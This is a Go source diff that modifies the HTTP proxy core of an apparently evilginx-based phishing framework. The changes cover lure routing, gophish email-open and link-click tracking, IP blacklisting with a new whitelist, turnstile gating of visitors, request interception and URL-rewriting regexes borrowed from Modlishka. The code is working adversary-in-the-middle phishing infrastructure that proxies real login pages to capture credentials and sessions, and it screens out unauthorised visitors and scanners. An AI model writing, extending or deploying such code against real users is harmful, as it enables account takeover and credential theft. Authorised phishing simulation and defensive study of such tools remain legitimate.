@@ -61,11 +61,11 @@ const (
 const (
 	httpReadTimeout  = 45 * time.Second
 	httpWriteTimeout = 45 * time.Second
-
-	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
-	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
-	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
 )
+
+// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
+var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
 type HttpProxy struct {
 	Server            *http.Server
@@ -216,12 +216,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 				if p.cfg.GetBlacklistMode() == "all" {
-					err := p.bl.AddIP(from_ip)
-					if p.bl.IsVerbose() {
-						if err != nil {
-							log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-						} else {
-							log.Warning("blacklisted ip address: %s", from_ip)
+					if !p.bl.IsWhitelisted(from_ip) {
+						err := p.bl.AddIP(from_ip)
+						if p.bl.IsVerbose() {
+							if err != nil {
+								log.Error("blacklist: %s", err)
+							} else {
+								log.Warning("blacklisted ip address: %s", from_ip)
+							}
 						}
 					}
 
@@ -238,38 +240,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
-			// Handle clicked link and email opened events
-			rid := ""
-			browser := map[string]string{}
-			ridr, _ := regexp.Compile(`user_id=([^\"]*)`)
-			trackr, _ := regexp.Compile(`track\?user_id=`)
-			rid_match := ridr.FindString(req_url)
-			opened_match := trackr.FindString(req_url)
-			//log.Debug("Track regex", trackr.FindString(req_url))
-			//log.Debug("Rid regex", ridr.FindString(req_url))
-			if len(rid_match) != 0 && len(opened_match) == 0 {
-				rid = strings.Split(rid_match, "=")[1]
-				browser = map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
-				err := database.HandleClickedLink(rid, browser, p.livefeed)
-				if err != nil {
-					log.Error("failed to add clicked link event to database: %s", err)
-				}
-			} else if len(rid_match) != 0 && len(opened_match) != 0 {
-				rid = strings.Split(rid_match, "=")[1]
-				browser = map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
-				err := database.HandleEmailOpened(rid, browser, p.livefeed)
-				if err != nil {
-					log.Error("failed to add email opened event to database: %s", err)
-				}
-			}
-
-			//log.Debug("http: %s", req_url)
-
-			remote_addr := from_ip
-
 			pl := p.getPhishletByPhishHost(req.Host)
-			//parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			//remote_addr := parts[0]
+			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -357,7 +329,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, req_path)
+					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
 					}
@@ -413,12 +385,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 											if p.cfg.GetBlacklistMode() == "unauth" {
-												err := p.bl.AddIP(from_ip)
-												if p.bl.IsVerbose() {
-													if err != nil {
-														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-													} else {
-														log.Warning("blacklisted ip address: %s", from_ip)
+												if !p.bl.IsWhitelisted(from_ip) {
+													err := p.bl.AddIP(from_ip)
+													if p.bl.IsVerbose() {
+														if err != nil {
+															log.Error("blacklist: %s", err)
+														} else {
+															log.Warning("blacklisted ip address: %s", from_ip)
+														}
 													}
 												}
 											}
@@ -431,14 +405,49 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								session, err := NewSession(pl.Name)
 								if err == nil {
+									// set params from url arguments
+									p.extractParams(session, req.URL)
+
+									// Debug - iterate over the map and print each key-value pair
+									/*for key, value := range session.Params {
+										fmt.Printf("%s: %s\n", key, value)
+									}*/
+
+									if trackParam, ok := session.Params["o"]; ok {
+										if trackParam == "track" {
+											// gophish email tracker image
+											rid, ok := session.Params["rid"]
+											if ok && rid != "" {
+												session.RId = rid
+												browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
+												session.Browser = browser
+												err := database.HandleEmailOpened(rid, browser, p.livefeed)
+												if err != nil {
+													log.Error("failed to add email opened event to database: %s", err)
+												}
+												log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+												return p.trackerImage(req)
+											}
+										}
+									}
+
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
-									session.RId = rid
-									session.Browser = browser
+
+									rid, ok := session.Params["rid"]
+									if ok && rid != "" {
+										session.RId = rid
+										browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
+										session.Browser = browser
+										err := database.HandleClickedLink(rid, browser, p.livefeed)
+										if err != nil {
+											log.Error("failed to add clicked link event to database: %s", err)
+										}
+									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -455,9 +464,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									session.PhishLure = l
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
-									// set params from url arguments
-									p.extractParams(session, req.URL)
-
 									ps.SessionId = session.Id
 									ps.Created = true
 									ps.Index = sid
@@ -466,20 +472,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									req_ok = true
 									if p.turnstile {
 										//fmt.Println("Redirecting to turnstile")
-										// Redirect to the turnstile page
-										return p.redirectTurnstile(req, session.RId)
+										// Redirect to the turnstile page if we successfully extracted a RId
+										if session.RId != "" {
+											return p.redirectTurnstile(req, session.RId)
+										} else {
+											return p.blockRequest(req)
+										}
 									}
 								}
 							} else {
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
-									err := p.bl.AddIP(from_ip)
-									if p.bl.IsVerbose() {
-										if err != nil {
-											log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-										} else {
-											log.Warning("blacklisted ip address: %s", from_ip)
+									if !p.bl.IsWhitelisted(from_ip) {
+										err := p.bl.AddIP(from_ip)
+										if p.bl.IsVerbose() {
+											if err != nil {
+												log.Error("blacklist: %s", err)
+											} else {
+												log.Warning("blacklisted ip address: %s", from_ip)
+											}
 										}
 									}
 								}
@@ -503,11 +515,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						if p.turnstile {
 							if !s.IsCaptchaDone {
-								// Redirect to the turnstile page
-								p.redirectTurnstile(req, s.RId)
+								// Redirect to the turnstile page if we successfully extracted a RId
+								if s.RId != "" {
+									p.redirectTurnstile(req, s.RId)
+								} else {
+									return p.blockRequest(req)
+								}
 							}
 						}
-						l, err := p.cfg.GetLureByPath(pl_name, req_path)
+						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
 							if l.Redirector != "" {
@@ -613,14 +629,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, req_path)
+					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-						if resp != nil {
-							resp.Header.Add("Location", rurl)
-							return req, resp
+						u, err := url.Parse(rurl)
+						if err == nil {
+							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", rurl)
+									return req, resp
+								}
+							}
 						}
 					}
 				}
@@ -635,18 +656,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// check if request should be intercepted
-				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
-							}
-						}
-					}
-				}
 				// replace "Host" header
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
@@ -918,6 +927,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+					}
+				}
+
+				// check if request should be intercepted
+				if pl != nil {
+					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+						for _, ic := range pl.intercept {
+							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							}
+						}
 					}
 				}
 
@@ -1316,7 +1338,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && stringExists(string(body), []string{"<head>", "<body>"}) {
+						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
@@ -1375,6 +1397,14 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		if resp != nil {
 			return req, resp
 		}
+	}
+	return req, nil
+}
+
+func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
+	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
+	if resp != nil {
+		return req, resp
 	}
 	return req, nil
 }
@@ -1486,44 +1516,46 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 				} else {
 					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 				}
+			} else {
+				log.Debug("extractParams: %s", err)
 			}
 		}
 	}
 	/*
-	   for k, v := range vals {
-	       if len(k) == 2 {
-	           // possible rc4 encryption key
-	           if len(v[0]) == 8 {
-	               enc_key = v[0]
-	               break
-	           }
-	       }
-	   }
+		   for k, v := range vals {
+			   if len(k) == 2 {
+				   // possible rc4 encryption key
+				   if len(v[0]) == 8 {
+					   enc_key = v[0]
+					   break
+				   }
+			   }
+		   }
 
-	   if len(enc_key) > 0 {
-	       for k, v := range vals {
-	           if len(k) == 3 {
-	               enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-	               if err == nil {
-	                   dec_params := make([]byte, len(enc_vals))
+		   if len(enc_key) > 0 {
+			   for k, v := range vals {
+				   if len(k) == 3 {
+					   enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
+					   if err == nil {
+						   dec_params := make([]byte, len(enc_vals))
 
-	                   c, _ := rc4.NewCipher([]byte(enc_key))
-	                   c.XORKeyStream(dec_params, enc_vals)
+						   c, _ := rc4.NewCipher([]byte(enc_key))
+						   c.XORKeyStream(dec_params, enc_vals)
 
-	                   params, err := url.ParseQuery(string(dec_params))
-	                   if err == nil {
-	                       for kk, vv := range params {
-	                           log.Debug("param: %s='%s'", kk, vv[0])
+						   params, err := url.ParseQuery(string(dec_params))
+						   if err == nil {
+							   for kk, vv := range params {
+								   log.Debug("param: %s='%s'", kk, vv[0])
 
-	                           session.Params[kk] = vv[0]
-	                       }
-	                       ret = true
-	                       break
-	                   }
-	               }
-	           }
-	       }
-	   }*/
+								   session.Params[kk] = vv[0]
+							   }
+							   ret = true
+							   break
+						   }
+					   }
+				   }
+			   }
+		   }*/
 	return ret
 }
 
@@ -1571,8 +1603,8 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 }
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
-	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
-	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
+	re_url := MATCH_URL_REGEXP
+	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME
 
 	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
 		var sub_map map[string]string = make(map[string]string)
